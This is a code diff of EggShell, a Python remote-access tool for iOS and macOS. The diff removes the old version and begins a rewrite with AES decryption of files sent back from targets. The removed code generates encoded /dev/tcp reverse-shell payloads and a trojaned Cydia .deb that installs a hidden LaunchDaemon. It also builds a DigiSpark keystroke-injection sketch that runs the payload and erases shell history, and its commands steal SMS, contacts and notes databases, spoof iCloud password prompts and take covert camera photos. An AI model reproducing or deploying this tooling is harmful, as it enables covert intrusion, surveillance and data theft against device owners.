@@ -1,863 +1,722 @@
-#!/usr/bin/python
-import base64,socket,sys,os,time,datetime,random,string,tarfile,os.path,platform
-from subprocess import call
-from sha import sha
+#NeonEggShell 2.0
+#Created By lucas.py 8-18-16
+import os,base64,random,string,socket,sys,time,binascii
+from Crypto import Random
+from Crypto.Cipher import AES
+from StringIO import StringIO
 from threading import Thread
 
-cdir = os.getcwd()
-eggemy = {} #class
-eggsessions = {}
-shouldclose=False
-class Eggemy:
-	def __init__(self,h,p):
-		self.host = h
-		self.port = p
-		self.eflag = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(12))
-		#self.eflag = "U61KXO9A5S2T"
-		
-	def listenforegg(self,verbose):
-		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-		s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-		s.bind(('0.0.0.0', int(self.port)))
-		s.listen(1) 
-		#generate random return key
-		if verbose:
-			strinfo("Starting Reverse Handler on "+str(self.port)+"...")
-		conn, addr = s.accept() #wait to connect to a host
-		if shouldclose:
-			return False
-		if verbose:
-			strinfo("Connecting to "+addr[0])
-		return self.bindegg(conn,self.host,self.port,self.eflag,s,verbose,addr[0])
-	
-	def bindegg(self,conn,host,port,eflag,s,verbose,address):
-		port = str(port)
-		conn.send("""
-if [ -d /Applications/MobileSafari.app ]
-then
-	launchctl unload /Library/LaunchDaemons/.sysinfo.plist >/dev/null 2>&1
-	echo ios >/dev/tcp/"""+host+"""/"""+port+""";
-	if [ ! -f /usr/bin/base64 ]
-	then
-		cat </dev/tcp/"""+host+"""/"""+port+""" >/tmp/networcd;
-		chmod +x /tmp/networcd;/tmp/networcd """+host+""" """+port+""" """+eflag+""";
-		rm /tmp/networcd;
-	else
-		timeout 30s bash <<EOT
-		cat </dev/tcp/"""+host+"""/"""+port+""" >/tmp/networcd;
-		chmod +x /tmp/networcd;/tmp/networcd """+host+""" """+port+""" """+eflag+""";
-		rm /tmp/networcd;
-EOT
-	fi
-	launchctl load /Library/LaunchDaemons/.sysinfo.plist >/dev/null 2>&1
-elif [ -d /Applications/Safari.app ]
-then
-	echo osx >/dev/tcp/"""+host+"""/"""+port+"""
-	cat </dev/tcp/"""+host+"""/"""+port+""" >/tmp/networcd;chmod +x /tmp/networcd;
-	/tmp/networcd """+host+""" """+port+""" """+eflag+""";rm /tmp/networcd;
-fi
-""");conn.close()
-			
-		#shitty shitty shitty shitty checker
-		dtype=""
-		while True:
-			conn, addr = s.accept()
-			if addr[0] == address:
-				break
-			else:
-				conn.close()
-		#RECIEVE device type
-		dtype = conn.recv(8);
-		conn.close()
-		payloaddata=""
-		if str("ios") in str(dtype):
-			settings=2
-			if verbose:
-				strinfo("Device is iOS")
-			payloaddata = open(cdir + "/esplios", "rb");
-		elif str("osx") in str(dtype):
-			settings=1
-			if verbose:
-				strinfo("Device is mac")
-			payloaddata = open(cdir + "/esplosx", "rb")
-		else:
-			strinfo("Device Detection Failed")
-		#SEND BINARY
-		
-		dtype=""
-		while True:
-			conn, addr = s.accept()
-			if addr[0] == address:
-				break
-			else:
-				conn.close()
-				
-		if verbose:
-			strinfo("Sending stage...") #when we get a connection we will send the stage
-		l = payloaddata.read(512)
-		while (l):
-			conn.send(l)
-			l = payloaddata.read(512)
-		payloaddata.close()
-		conn.close()	
-		#CONNECT TO BINARY
-		conn, addr = s.accept() #last blink, accept the connect back connection from the payload running in the background in memory 
-		data = conn.recv(512)
-		#while not data: # While the input given is an empty string
-		#	print "continue"
-		#	conn, addr = s.accept() #last blink, accept the connect back connection from the payload running in the background in memory 
-		#	data = conn.recv(128)
-			#startserver(str(host),str(port))
-		if data == "n":
-			strinfo("user declined connection")
-			exit()
-		if data: #payload should return the name of the device and we will use that as our prompt
-			name = data
-			#spawn our interactive shell
-			return {'nam':name, 'con':conn,'host':host,'port':port,'set':settings,'efl':eflag }
-			#Eggemy(name,conn,s,settings,host,port,eflag)
-
-#define colors :)
-BG = '\033[3;32m'
-UGREEN = '\033[4;92m'
+debug = 0
+TERM = "EOF6D2ONE"
+homeDir = os.getcwd()+"/"
+UNDERLINE_GREEN = '\033[4;92m'
 GREEN = '\033[1;92m'
-RED = '\033[1;91m'
-UR = '\033[4;91m'
 WHITE = '\033[0;97m'
-INFO = '\033[0;36m'
 WHITEBU = '\033[1;4m'
-NES = '\033[4;32m'+"NES"+WHITE+"> "
+RED = '\033[1;91m'
 ENDC = '\033[0m'
+COLOR_INFO = '\033[0;36m'
+NES = '\033[4;32m'+"NES"+WHITE+"> "
+BANNER_ART_TEXT = GREEN+"""
+.---.          .-. .        . .       \\      `.
+|             (   )|        | |     o  \\       `.
+|--- .-.. .-.. `-. |--. .-. | |         \\        `.
+|   (   |(   |(   )|  |(.-' | |     o    \\      .`
+'---'`-`| `-`| `-' '  `-`--'`-`-          \\   .`
+     ._.' ._.'                               `          """+RED+"""
+ _._._._._._._._._._|"""+COLOR_INFO+"______________________________________________."+RED+"""
+|_#_#_#_#_#_#_#_#_#_|"""+COLOR_INFO+"_____________________________________________/"+RED+"""
+                    l
+"""+WHITE+"\nVersion: 2.0\nCreated By Lucas Jackson (@neoneggplant)\n"+ENDC
+BANNER_MENU_TEXT = WHITE + "-"*40 + "\n" + """ Menu:
+    1): Start Server
+    2): Start Multi Session
+    3): Create Payload
+    4): Exit
+""" + WHITE + "-"*40
+MENU = BANNER_ART_TEXT + "" + BANNER_MENU_TEXT + "\n" + NES
 
-#banner menu
-def banner():
-	os.system('clear')
-	print GREEN+base64.b64decode("PC0uIChgLScpXyAoYC0nKSAgXyAoYC0nKS4tPiAKICAgXCggT08pICkoIE9PKS4tLyAoIE9PKV8gICAKLC0tLi8gLC0tLygsLS0tLS0tLihfKS0tXF8pICAKfCAgIFwgfCAgfCB8ICAuLS0tJy8gICAgXyAvICAKfCAgLiAnfCAgfHx8ICAnLS0uIFxfLi5gLS0uICAKfCAgfFwgICAgfCB8ICAuLS0nIC4tLl8pICAgXCAKfCAgfCBcICAgfCB8ICBgLS0tLlwgICAgICAgLyAKYC0tJyAgYC0tJyBgLS0tLS0tJyBgLS0tLS0n")
-	print WHITE + "     [Version 1.9.5-4]\n"+\
-	RED + "  Created by NeonEggplant\n"+\
-	WHITE+"\niOS/OSX System Remote Control\nCreate DEB, SHELL, and Arduino Payloads\n"+\
-	WHITE + "http://neoneegplants.com\n"+\
-	"-" * 45+"\n  NES Menu\n\
-     1): Start server\n\
-     2): Start multi server\n\
-     3): Create Shell Script payload\n\
-     4): Create Cydia Deb File payload\n\
-     5): Create Arduino based payload\n\
-     6): How to/About\n\
-     7): Exit\n"+\
-	 WHITE + "-" * 45
+sessions = {}
 
+OSX_BINARY = "resources/esplosx"
+OSX_BINARY = "/Users/lucasjackson/Library/Developer/Xcode/DerivedData/Eggshell_OSX_Payload-gsxdeektmbxprqglhkldukermjdv/Build/Products/Debug/esplosx"
+iOS_BINARY = "resources/esplios"
+nesProDylib = "resources/eggshellPro.dylib"
+#MARK: AES Encryption
 
-#main menu
-def mainmenu(err):
-	banner()
-	host=getip();
-	port=4444 #default port if one isnt set
-	if err!=1 and err!="": #error message for invalid option
-		print RED+"error: "+"\""+err+"\" is not a valid option"
-	else:
-		print
-	option = raw_input(NES)
-	#SELECT FROM MENU
-	if option=="1":
-		strinfo("Preparing Server")
-		sethost = raw_input(NES+"SET LHOST (Leave blank for "+host+"):")
-		if sethost!="":
-			host = sethost
-		strinfo("LHOST=>"+host)
-		setport = raw_input(NES+"SET LPORT (Leave blank for "+str(port)+"):")
-		if setport!="":
-			port=setport
-		strinfo("LPORT=>"+str(port))
-		startserver(str(host),str(port))
-	elif option=="2":
-		strinfo("Preparing Multi Server")
-		sethost = raw_input(NES+"SET LHOST (Leave blank for "+host+"):")
-		if sethost!="":
-			host = sethost
-		strinfo("LHOST=>"+host)
-		setport = raw_input(NES+"SET LPORT (Leave blank for "+str(port)+"):")
-		if setport!="":
-			port=setport
-		strinfo("LPORT=>"+str(port))
-		bgserver = Thread(target = multiserver, args=(host,port,))
-		bgserver.daemon=True
-		bgserver.start()
-		time.sleep(0.01)
-		multiservercontroller(port)
-		bgserver.join()
-	elif option=="3":
-		strinfo("Preparing Shell Script")
-		sethost = raw_input(NES+"SET LHOST (Leave blank for "+host+"):")
-		if sethost!="":
-			host = sethost
-		strinfo("LHOST=>"+host)
-		setport = raw_input(NES+"SET LPORT (Leave blank for "+str(port)+"):")
-		if setport!="":
-			port=setport
-		strinfo("LPORT=>"+str(port))
-		setpersistent = raw_input(NES+"Make it a background job? (reconnect after exit)(y/N):")
-		if str(setpersistent).lower()=="y":
-			setpersistent = True
-		else:
-			setpersistent = False
-		strinfo("background=>"+str(setpersistent))
-		createshellscript(str(host),str(port),setpersistent)
-	elif option=="4":
-		strinfo("Preparing Deb File")
-		sethost = raw_input(NES+"SET LHOST (Leave blank for "+host+"):")
-		if sethost!="":
-			host = sethost
-		strinfo("LHOST=>"+host)
-		setport = raw_input(NES+"SET LPORT (Leave blank for "+str(port)+"):")
-		if setport!="":
-			port=setport
-		strinfo("LPORT=>"+str(port))
-		createdebfile(str(host),str(port))
-	elif option=="5":
-		strinfo("Please Select a Device\n\n     1): Arduino/Teensy\n     2): DigiSpark\n")
-		option = raw_input(NES + "device: ")
-		sethost = raw_input(NES+"SET LHOST (Leave blank for "+host+"):")
-		if sethost!="":
-			host = sethost
-		strinfo("LHOST=>"+host)
-		setport = raw_input(NES+"SET LPORT (Leave blank for "+str(port)+"):")
-		if setport!="":
-			port=setport
-		strinfo("LPORT=>"+str(port))
-		setpersistent = raw_input(NES+"Make it a background job? (reconnect after exit)(y/N):")
-		if str(setpersistent).lower()=="y":
-			setpersistent = True
-		else:
-			setpersistent = False
-		strinfo("background=>"+str(setpersistent))
-		createino(option,str(host),str(port),setpersistent)
-		startserverprompt(host,port)
-	elif option=="6":
-		about()
-	elif (option=="7") or (option=="exit"):
-		print ENDC
-		os.system("clear")
-		exit()
-	else:
-		mainmenu(option)
-	mainmenu(1)
+#A random encryption key is created every time eggshell.py is run
+def createKey():
+    if debug:
+        return "12345678123456781234567812345678"
+    chars = string.letters + string.digits + "*"
+    return ''.join((random.choice(chars)) for x in range(32))
 
-#start the server 
-def startserver(host,port):
-	eggemy[1] = Eggemy(host,port)
-	egg = eggemy[1].listenforegg(True)
-	#define our socket
-	interactiveshell(egg['nam'],egg['con'],egg['set'],egg['host'],egg['port'],egg['efl'],False)
-	mainmenu(1)
+#generate key/define global
+shellKey = createKey()
+#binary key is used to decrypt the encrypted shell key, exists inside binaries as well
+binaryKey = "spGHbigdxMBJpbOCAr3rnS3inCdYQyZV"
 
-def multiserver(host,port):
-	global eggsessions
-	x = 1
-	strinfo("Starting Background Multi Server on "+str(port)+"...")	
-	print "type \"help\" for MultiServer commands"
-	while(1):
-		eggemy[x] = Eggemy(host,port)
-		egg = eggemy[x].listenforegg(False)
-		if not egg:
-			break
-		eggsessions[x] = egg
-		sys.stdout.write("\n\r"+INFO+"[*]  "+WHITE+"Session "+str(x)+" opened")
-		sys.stdout.flush()
-		x+=1
-		
-def multiservercontroller(port):
-	global eggsessions
-	while(1):
-		cmd = raw_input(WHITE+""+UR+"MultiServer"+WHITE+"> ")
-		if cmd != "":
-			if cmd.split()[0] == "interact":
-				if len(cmd.split()) >= 2:
-					try:
-						sn = int(cmd.split()[1])
-					except:
-						sn = -1
-					if sn in eggsessions:
-						egg = eggsessions[sn]
-						interactiveshell(egg['nam'],egg['con'],egg['set'],egg['host'],egg['port'],egg['efl'],True)
-					else:
-						print "invalid session"
-				else:
-					print "Usage: interact (session number)"
-			elif cmd == "sessions":
-				x = 0
-				if len(eggsessions) == 0:
-					print "No active sessions"
-				else:
-					print " "+WHITEBU+"Active Sessions"+WHITE
-				while x < len(eggsessions):
-					x+=1
-					egg = eggsessions[x]
-					print "   "+str(x)+". "+egg['nam']
-			elif cmd == "help":
-				print "\n "+WHITE+ WHITEBU + "MultiServer Commands\n" + WHITE
-				print " sessions    - show current sessions"
-				print " interact    - interact with a session. Usage: interact (session number)"
-				print " back        - go back to the multisession controller from a session"
-				print " exit        - go back to the main menu"
-				print " clear       - clear screen\n"
-			elif cmd == "clear":
-				os.system('clear')
-			elif cmd == "exit":
-				#SEND SHUTDOWN COMMAND TO OUR THREAD
-				global shouldclose
-				shouldclose = True
-				s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-				s.connect(("127.0.0.1", port));s.send(".")
-				time.sleep(0.1)
-				shouldclose = False
-				x = 0
-				while x < len(eggsessions):
-					x+=1
-					egg = eggsessions[x]
-					strinfo("closing session "+str(x))
-					egg['con'].close()
-					type(eggsessions)
-				eggsessions = {}
-				break
-				#close any open sessions
-				
-#interactive shell
-def interactiveshell(name,conn,settings,host,port,eflag,ismulti):	
-	#begin interactive shell
-	strinfo("NES Session Started")
-	print "type \"help\" for commands"
-	name = UGREEN + name.replace("\n","")+ENDC+GREEN+"> "+ENDC
-	while 1:
-		option=0
-		cmd = raw_input(name);
-		if cmd:
-			#mac
-			if settings == 1:
-				if cmd.split()[0]=="screenshot":
-					option=2
-				elif cmd.split()[0]=="camshot":
-					option=3
-				elif cmd.split()[0]=="imessage":
-					address = base64.b64encode(raw_input("recipient: "))
-					message = base64.b64encode(raw_input("message: ").replace('"','\"'))
-					cmd = cmd + " " + address + " " + message
-				elif cmd.split()[0] == "mic":
-					if len(cmd.split()) == 2:
-						if cmd.split()[1] == "stop":
-							date_string = datetime.datetime.now().strftime("%Y%m%d%H%M%S")
-							file="mic-"+date_string+".caf"
-							conn.send(base64.b64encode(cmd) + "\n")
-							stat = conn.recv(1)
-							if stat == "y":
-								fsize = conn.recv(16)
-								fsize = int(fsize) + 12;
-								tmpdata=""
-								while 1:
-									slick = conn.recv(65536)
-									tmpdata = tmpdata + slick
-									sys.stdout.write("\r"+INFO+"[*]  "+WHITE+"Downloading "+file+" ("+str(len(tmpdata))+"/"+str(fsize)+") bytes")
-									sys.stdout.flush()
-									if eflag in tmpdata:
-										tmpdata = tmpdata.replace(eflag,"")
-										with open(file,"wb") as f:
-											f.write( base64.b64decode(tmpdata))#write all our data to file
-										print
-										strinfo("Done!")						
-										break
-							else:
-								strinfo("ERROR: Mic isn't running")
-							continue
-			#ios
-			elif settings == 2:					
-				if cmd=="alert":
-					title = raw_input("alert title: ")
-					title = base64.b64encode(title)
-					message = raw_input("alert message: ")
-					message = base64.b64encode(message)
-					cmd = cmd + " " + title + " " + message
-				elif cmd.split()[0]=="screenshot":
-					print "Activating screenshotter..."
-				elif cmd.split()[0]=="install":
-					if len(cmd.split()) == 2:
-						if cmd.split()[1]=="persistence":
-							delay = ""
-							while not delay: # While the input given is an empty string
-								delay = raw_input(NES+"SET RECONNECT DELAY (Leave blank for 30, minimum 5): ")
-								if delay:
-									if int(delay) < 5:
-										print "must be at least 5"
-										delay = ""
-								else:
-									delay = "30"
-								cmd = cmd.split()[0]+" "+cmd.split()[1]+" "+delay
-						elif cmd.split()[1]=="nespro":
-							dylib = cdir + "/nespro.dylib"
-							if os.path.isfile(dylib) != True:
-								strinfo("nespro.dylib not found")
-								print "If you already have NESPRO make sure its in the current directory"
-								continue
-							conn.send(base64.b64encode(cmd) + "\n")
-							if str(conn.recv(1)) == "y":
-								print "[*]  nespro is already installed"					
-							else:
-								print "[*]  uploading dylib"
-								f = open(dylib,mode='rb')
-								fdata = base64.b64encode(f.read())
-								conn.send(str(len(fdata)) + "\n")
-								time.sleep(0.5)
-								conn.send(str(fdata) + "\n")
-								print conn.recv(48)
-							continue
-						else:
-							strinfo("addon not available")
-							continue
-				elif cmd.split()[0]=="frontcam":
-					print "activating front camera..."
-					option=4;
-				elif cmd.split()[0]=="backcam":
-					print "activating back camera..."
-					option=5;
-				elif cmd.split()[0]=="getsms":
-					cmd="download /var/mobile/Library/SMS/sms.db"
-					recvfile(cmd,conn,eflag)
-					continue
-				elif cmd.split()[0]=="getaddbook":
-					cmd="download /var/mobile/Library/AddressBook/AddressBook.sqlitedb"
-					recvfile(cmd,conn,eflag)
-					continue
-				elif cmd.split()[0]=="getnotes":
-					cmd="download /var/mobile/Library/Notes/notes.sqlite"
-					recvfile(cmd,conn,eflag)
-					continue
-				
-			#universal
-			if cmd.split()[0] == "lls":
-				if len(cmd.split()) == 1:
-					os.system('ls')
-				else:
-					os.system('ls ' + cmd.replace("lls ",""))
-				continue
-			elif cmd.split()[0] == "lopen":
-				if len(cmd.split()) == 1:
-					print "lopen - missing argument"+BG
-				else:
-					os.system('open ' + cmd.replace("lopen ",""))
-				continue
-			elif cmd.split()[0]=="download":
-				if len(cmd.split()) >= 2:
-					recvfile(cmd,conn,eflag)
-					continue
-			elif cmd.split()[0]=="upload":
-					if len(cmd.split()) == 2:
-						fname = cmd.split()[1]
-						f = open(fname)
-						fdata = f.read()
-						filelen = len(base64.b64encode(fdata))
-						conn.send(base64.b64encode("upload") + "\n")
-						conn.send(str(fname) + "\n")
-						conn.send(str(filelen) + "\n")
-						conn.send(base64.b64encode(fdata) + "\n")
-			elif cmd == "lpwd":
-				print os.getcwd()
-				continue
-			elif cmd.split()[0] == "lcd":
-				os.chdir(cmd.split()[1])
-				continue
-			elif cmd=="clear":
-				os.system('clear')
-				continue
-			elif cmd=="prompt":
-				print "Opening password prompt on device..."
-				conn.settimeout(3600)
-			elif cmd=="back":
-				if ismulti:
-					strinfo("sending session to background")
-					time.sleep(0.3)
-					break
-			elif cmd=="exit":
-				strinfo("closing connection")
-				conn.send(base64.b64encode("exit") + "\n")
-				time.sleep(0.3)
-				break
-			elif cmd == "help":
-				time.sleep(0.2)
-				showhelp(settings)
-				continue
-		else:
-			cmd="null"
-		getdata(cmd,option,conn,eflag)	
-		
-def recvfile(cmd,conn,eflag):
-	file=cmd.split()[1]
-	if "/" in file: #save file as the last array of characters after / if file is in another directory
-		file=file.split('/')[-1]
-	conn.send(base64.b64encode(cmd) + "\n")
-	if conn.recv(1) == "y":
-		fsize = ""
-		while True:
-			fsizecollect = conn.recv(1)
-			if fsizecollect == "*":
-				break
-			fsize = fsize + fsizecollect
-		fsize = int(fsize) + 12;
-		tmpdata=""
-		while 1:
-			slick = conn.recv(8192)
-			tmpdata = tmpdata + slick
-			sys.stdout.write("\r"+INFO+"[*]  "+WHITE+"Downloading "+file+" ("+str(len(tmpdata))+"/"+str(fsize)+") bytes")
-			sys.stdout.flush()
-			if eflag in tmpdata:
-				tmpdata = tmpdata.replace(eflag,"")
-				
-				with open(file,"wb") as f:
-					f.write( base64.b64decode(tmpdata))#write all our data to file
-				print
-				strinfo("Done!")						
-				break
-	else:
-		strinfo("ERROR: file not found")
-
-#send command to the device then recieve data 
-def getdata(cmd,option,conn,eflag):
-		conn.send(base64.b64encode(cmd) + "\n") #send cmd
-		appendeddata=""
-		while 1: #get all data
-			data = conn.recv(1024)
-			appendeddata = appendeddata + data
-			if eflag in data:
-				#replace junk
-				appendeddata = appendeddata.replace(eflag,"")
-				if appendeddata == "":
-					break
-				if option==2:
-					if "cycript" in appendeddata:
-						print appendeddata
-					else:
-						appendeddata = find_between( appendeddata, "EOFSTART", "EOFEND" )
-						date_string = datetime.datetime.now().strftime("%Y%m%d%H%M%S")
-						filename="screenshot-"+date_string+".tiff"
-						with open(filename,"wb") as f:#create file
-							f.write(base64.b64decode(appendeddata))#write to file
-							print "saving to "+filename
-				elif option==3:
-					appendeddata = find_between( appendeddata, "EOFSTART", "EOFEND" )
-					date_string = datetime.datetime.now().strftime("%Y%m%d%H%M%S")
-					filename="isight-"+date_string+".jpg"
-					with open(filename,"wb") as f:#create file
-						f.write(base64.b64decode(appendeddata))#write to file
-						print "saving to "+filename
-				elif (option==4) or (option==5):
-					savecamera(option,find_between( appendeddata, "EOFSTART", "EOFEND" ))
-				else:
-					#REGULAR RETURN DATA, NO SAVING FILES
-					appendeddata = appendeddata.splitlines()
-					for x in range(0,len(appendeddata)):
-						if not "CoreFoundation = " in appendeddata[x]:
-							print appendeddata[x];
-						x += 1
-				break;
-
-#gets our current ip
-def getip():
-	s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM);s.connect(("192.168.1.1",80));host = s.getsockname()[0];s.close()
-	return host
-	
-#prompt user if they want to start the server
-def startserverprompt(host,port):
-	listenop = raw_input(NES+"Start Server? (Y/n): ")
-	if listenop == "n":
-		mainmenu(1)
-	startserver(str(host),str(port))
-	
-#GENERATE BASE64 PAYLOAD
-def createshellscript(host,port,ispersistent):
-	payload=''
-	if ispersistent:
-		payload=base64.b64encode("while true; do cat </dev/tcp/"+host+"/"+port+" | sh; sleep 5; done & exit")
-	else:
-		payload=base64.b64encode("cat </dev/tcp/"+host+"/"+port+" | sh & exit")
-	strinfo("Creating Payload...")
-	
-	print INFO + "echo "+payload+" | base64 --decode | bash >/dev/null 2>&1"+ENDC
-	startserverprompt(host,int(port))
-	
-#createArduino .ino file
-def createino(option,host,port,ispersistent):
-	if int(option) == 1:
-		print "not supported yet"
-		exit()
-	elif int(option) == 2:
-		payload=''
-		if ispersistent:
-			payload=base64.b64encode("while true; do cat </dev/tcp/"+host+"/"+port+" | sh; sleep 5; done & exit")
-		else:
-			payload=base64.b64encode("cat </dev/tcp/"+str(host)+"/"+str(port)+" | sh & exit")
-		payload = "echo "+payload+" | base64 --decode | bash >/dev/null 2>&1"
-	
-		strinfo("writing to arduino/digispark_injector.ino")
-		time.sleep(0.2)		
-		if not os.path.isdir("arduino"):
-			os.makedirs("arduino")
-		with open("arduino/digispark_injector.ino","w") as f:
-			f.write("""//Created with NeonEggShell by neoneggplant
-#include <DigiKeyboard.h>
-const int pin = 1;//default onboard led pin
-void setup() {
-  pinMode(1,OUTPUT); //we are going to control this pin
-  DigiKeyboard.sendKeyStroke(KEY_W, MOD_GUI_LEFT);//bypass "Keyboard Setup" prompt
-  delay(500);
-  DigiKeyboard.sendKeyStroke(KEY_SPACE, MOD_GUI_LEFT);//open spotlight
-  delay(500);
-  DigiKeyboard.println("Terminal");//open terminal
-  delay(4000);  
-  DigiKeyboard.println("""+"\""+payload+""";history -wc;killall Terminal;"); //execute payload, clear history, close terminal
-}
-void loop() {
-  //blink when done
-  digitalWrite(1,HIGH);
-  delay(200);
-  digitalWrite(1,LOW);
-  delay(200);
-}
-""")
-
-#our launchdaemon
-launchd="""echo \"\"\"<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
-<plist version="1.0">
-	<dict>
-		<key>Label</key>
-		<string>com.example.app</string>
-		<key>Program</key>
-		<string>/usr/bin/.sys</string>
-		<key>RunAtLoad</key>
-		<true/>
-	</dict>
-</plist>\"\"\" >/Library/LaunchDaemons/.sysinfo.plist;chmod +x /usr/bin/.sys;chmod 644 /Library/LaunchDaemons/.sysinfo.plist;launchctl unload /Library/LaunchDaemons/.sysinfo.plist >/dev/null 2>&1;launchctl load /Library/LaunchDaemons/.sysinfo.plist
-"""
-
-def make_tarfile(output_filename, source_dir):
-    with tarfile.open(output_filename, "w:gz") as tar:
-        tar.add(source_dir, arcname=os.path.basename(source_dir))
+#PKCS7Encoding
+class PKCS7Encoder(object):
+    def __init__(self, k=16):
+        self.k = k
+    
+    ## @param text The padded text for which the padding is to be removed.
+    # @exception ValueError Raised when the input padding is missing or corrupt.
+    def decode(self, text):
+        nl = len(text)
+        val = int(binascii.hexlify(text[-1]), 16)
+        if val > self.k:
+            raise ValueError('Input is not padded or padding is corrupt')
         
-#create deb file, must have dpkg installed
-def createdebfile(host,port):
-	strinfo("[*]  " + WHITE + "Begin control file setup")
-	nme = '';pkg = '';vrsn = '';descrip = '';mntner = '';auth = '';sectn = ''
-	while not nme: # While the input given is an empty string
-		nme=raw_input(NES+'Name: '+WHITE)
-	while not pkg: # While the input given is an empty string
-		pkg=raw_input(NES+'Package: '+WHITE)
-		pkg=pkg.replace(' ',"-")
-	while not vrsn: # While the input given is an empty string
-		vrsn=raw_input(NES+'Version: '+WHITE)
-	while not descrip:
-		descrip=raw_input(NES+'Description: '+WHITE)
-	while not sectn:
-		sectn=raw_input(NES+'Section: '+WHITE)
-	while not mntner:
-		mntner=raw_input(NES+'Maintainer: '+WHITE)
-	while not auth:
-		auth=raw_input(NES+'Author: '+WHITE)
-	strinfo("Name => "+nme)
-	strinfo("Package => "+pkg)
-	strinfo("Version => "+vrsn)
-	strinfo("Section => "+sectn)
-	strinfo("Description => "+descrip)
-	strinfo("Maintainer => "+mntner)
-	strinfo("Author => "+auth)
-	time.sleep(0.5)
-	strinfo("Preparing Files")
-	time.sleep(0.5)
-	strinfo("Creating file \""+nme+".deb\"")
-	#create deb
-	os.makedirs(nme);os.chdir(nme)
-	os.makedirs("DEBIAN")
-	os.chdir("DEBIAN")
-	#WRITE CONTROL FILE
-	file = open('control', 'w+')
-	file.write(\
-	"Package: "+pkg+"\n"+\
-	"Name: "+nme+"\n"+\
-	"Version: "+vrsn+"\n"+\
-	"Architecture: iphoneos-arm\n"+\
-	"Description: "+descrip+"\n"+\
-	"Section: "+sectn+"\n"+\
-	"Maintainer: "+mntner+"\n"+\
-	"Author: "+auth+"\n"\
-	)
-	file.close()
-	#WRITE POSTINST FILE
-	file = open('postinst', 'w+')
-	pload="cat </dev/tcp/"+host+"/"+port+" | sh & exit"
-	pload="echo '#!/bin/bash\n"+pload+"'>/usr/bin/.sys;"
-	file.write(\
-	"#!/bin/bash\n"+\
-	pload+launchd\
-	)
-	file.close()
-	#SET PERMISSIONS
-	os.chmod('postinst', 0755)
-	os.chdir("../..")
-	file = open('debian-binary', 'w+');file.write("2.0\n");file.close()
-	os.system("dpkg -b "+nme+" "+nme+".deb >/dev/null 2>&1")	
-	startserverprompt(host,port)	
+        l = nl - val
+        return text[:l]
+    
+    ## @param text The text to encode.
+    def encode(self, text):
+        l = len(text)
+        output = StringIO()
+        val = self.k - (l % self.k)
+        for _ in xrange(val):
+            output.write('%02x' % val)
+        return text + binascii.unhexlify(output.getvalue())
 
-#save base64 data to image file from camera (front/back)
-def savecamera(fb,data):
-	date_string = datetime.datetime.now().strftime("%Y%m%d%H%M%S")
-	filename=""
-	if fb==4:
-		filename="camera_front_ios-"+date_string+".jpg"
-	elif fb==5:
-		filename="camera_back_ios-"+date_string+".jpg"
-	with open(filename,"wb") as f:#create file
-		f.write(base64.b64decode(data))#write to file
-		print "saving to "+filename
+encoder = PKCS7Encoder()
 
-#simple function that gets text between two strings
-def find_between( s, first, last ):
-    try:
-        start = s.index( first ) + len( first )
-        end = s.index( last, start )
-        return s[start:end]
-    except ValueError:
-        return ""
+#decrypt files that were sent from targets
+def decryptFile(filein, fileout, password,fileSize, key_length=16):
+    iv = "\x00" * 16
+    aes = AES.new(password, AES.MODE_CBC, iv)
+    
+    print strinfo("decrypting file")
+
+    #encodepadding
+    in_file = open(filein,"rb")
+    encryptedData = in_file.read()
+    pad_text = encoder.encode(encryptedData)
+    in_file.close()
+
+    #decrypt,get length
+    decryptedData = aes.decrypt(pad_text)
+    dataSize = len(decryptedData)
+    
+    offset = dataSize - fileSize
+    
+    if offset < 0:
+        print strinfo("error decrypting data :(")
+
+    #write data subtracting the offset
+    out_file = open(fileout,'a+b')
+    out_file.write(decryptedData[:-offset])
+    out_file.close()
+
+#Our AES Encryption Class
+class AESEncryption:
+    def __init__(self, key=None, BS=None):
+        self.key = key
+        self.pkcs7 = PKCS7Encoder()
+        self.BS = (BS if BS else None)
+    
+    def decode(self, encodedEncrypted, BS=16):
+        if self.key is None:
+            raise ValueError("key is required")
+    
+        BS = (self.BS if self.BS else BS)
+        cipher = AES.new(self.key)
         
-#show commands
-def showhelp(settings):
-	print "\n "+WHITE+ WHITEBU + "NES Commands\n" + WHITE
-	print " download    - usage: download file.jpg"
-	print " sysinfo     - get current machine user and name"
-	print " ip          - view active ip"
-	if settings == 1:
-		#OSX NES Specials 
-		print " itstatus    - iTunes status "
-		print " play        - iTunes play "
-		print " pause       - iTunes pause "
-		print " next        - iTunes next track"
-		print " prev        - iTunes previous track"
-		print " setvol      - set device volume"
-		print " getvol      - get device volume"
-		print " idletime    - last time device was interacted with"
-		print " screenshot  - take screenshot"
-		print " camshot     - take picture with isight camera"
-		print " mic         - record audio with the microphone "
-		print " prompt      - password prompt spoof"
-		print " brightness  - set screen brightness"
-		print " getpaste    - get string from clipboard\n"
-	elif settings == 2:
-		#IOS NES Specials 
-		print " flash       - turn on flash for -t (seconds)"
-		print " say         - say command"
-		print " vibrate     - vibrate device"
-		print " alert       - display an alert"
-		print " setvol      - media control set volume"
-		print " getvol      - media control get volume"
-		print " isplaying   - media control is playing?"
-		print " prompt      - spoof icloud password prompt"
-		print " frontcam    - take photo with front camera"
-		print " backcam     - take photo with back/rear camera"
-		print " listapps    - list all bundle id's"
-		print " launch      - launch apps by bundle id"
-		print " getlocation - retrieve gps coordinates if locationservices are enabled"
-		print " getpower    - retrieve battery life"
-		print " getsms      - download the sms database"
-		print " getaddbook  - download the addressbook database"
-		print " getnotes    - download the notes database"
-		print " getpaste    - get PasteBoard contents (only works if device is unlocked)"
-		print " install     - install addons"
-		print " uninstall   - uninstall addons"
-		print "\n " + WHITEBU + "NESPRO Commands\n" + WHITE
-		print " play        - media control play"
-		print " pause       - media control pause"
-		print " prev        - media control previous track"
-		print " next        - media control next track"
-		#print " screenshot  - take and save screenshot" #ill eventually get around to this
-		print " wake        - wake device"
-		print " lock        - simulate lock button"
-		print " home        - simulate home button"
-		print " doublehome  - simulate doublepress home button"
-		print " tmute       - toggle mute"
-		print " lastapp     - retrieve last app opened"
-		print " islocked    - check if device is currently locked with passcode"
-		print " trypass     - try to unlock device with passcode"
-		print " openurl     - open url in safari"
